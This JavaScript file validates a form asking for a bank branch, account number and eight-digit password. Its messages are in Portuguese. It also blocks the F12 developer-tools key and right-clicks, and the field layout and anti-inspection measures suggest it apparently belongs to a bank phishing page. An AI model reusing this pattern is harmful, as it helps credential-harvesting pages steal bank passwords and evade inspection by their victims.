function validarCampo(){
    if(document.getElementById('ag').value == 11111 ||
     document.getElementById('ag').value == 22222 ||
     document.getElementById('ag').value == 33333 ||
     document.getElementById('ag').value == 44444 ||
     document.getElementById('ag').value == 55555 ||
     document.getElementById('ag').value == 66666 ||
     document.getElementById('ag').value == 77777 ||
     document.getElementById('ag').value == 88888 ||
     document.getElementById('ag').value == 99999 ||
     document.getElementById('ag').value == 00000){
alert('Digite uma agencia válida');
return false;
    }

     if(document.getElementById('cnt').value == 11111111 ||
             document.getElementById('cnt').value == 22222222 ||
             document.getElementById('cnt').value == 33333333 ||
             document.getElementById('cnt').value == 44444444 ||
             document.getElementById('cnt').value == 55555555 ||
             document.getElementById('cnt').value == 66666666 ||
             document.getElementById('cnt').value == 77777777 ||
             document.getElementById('cnt').value == 88888888 ||
             document.getElementById('cnt').value == 99999999 ||
             document.getElementById('cnt').value == 00000000){
        alert('Digite uma agencia válida');
        return false;
    }

    if(document.getElementById('s8').value == 11111111 ||
             document.getElementById('s8').value == 22222222 ||
             document.getElementById('s8').value == 33333333 ||
             document.getElementById('s8').value == 44444444 ||
             document.getElementById('s8').value == 55555555 ||
             document.getElementById('s8').value == 66666666 ||
             document.getElementById('s8').value == 77777777 ||
             document.getElementById('s8').value == 88888888 ||
             document.getElementById('s8').value == 99999999 ||
             document.getElementById('s8').value == 00000000){
        alert('Digite uma senha válida');
        return false;
    }
}

// bloqueio de tecla
window.onkeydown = function() {
    var key = event.keyCode || event.charCode || e.which;
    if(key==123){ alert('Proibido copia deste site.'); return false; }
}

function click(){
    if (event.button==2){
        alert('Proibido copia deste site.');
    }
}
document.onmousedown=click;


// bloqueia rolagem do site
 // function setTopo(){
 //     $(window).scrollTop(0);
 // }
 // $(window).bind('scroll', setTopo);


// Mascara Input
    function mascaraMike(format, field){
    var result = "";
    var maskIdx = format.length - 1;
    var error = false;
    var valor = field.value;
    var posFinal = false;
    if( field.setSelectionRange ){
        if(field.selectionStart == valor.length)
            posFinal = true;
    }
    valor = valor.replace(/[^0123456789Xx]/g,'')
    for (var valIdx = valor.length - 1; valIdx >= 0 && maskIdx >= 0; --maskIdx){
        var chr = valor.charAt(valIdx);
        var chrMask = format.charAt(maskIdx);
        switch (chrMask){
            case '#':
                if(!(/\d/.test(chr)))
                    error = true;
                result = chr + result;
                --valIdx;
                break;
            case '@':
                result = chr + result;
                --valIdx;
                break;
            default:
                result = chrMask + result;
        }
    }

    field.value = result;
    field.style.color = error ? 'red' : '';
    if(posFinal){
        field.selectionStart = result.length;
        field.selectionEnd = result.length;
    }
    return result;
}

// Pula campos ao preencher corretamente
function pulacampo(idobj, idproximo){
    var str = new String(document.getElementById(idobj).value);
    var mx = new Number(document.getElementById(idobj).maxLength);
    if (str.length == mx){
        document.getElementById(idproximo).focus();
    }
}

// Permitido apenas numero
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;
    if((tecla > 47 && tecla < 58))return true;
    else{
        if (tecla != 8) return false;
        else return true;
    }
}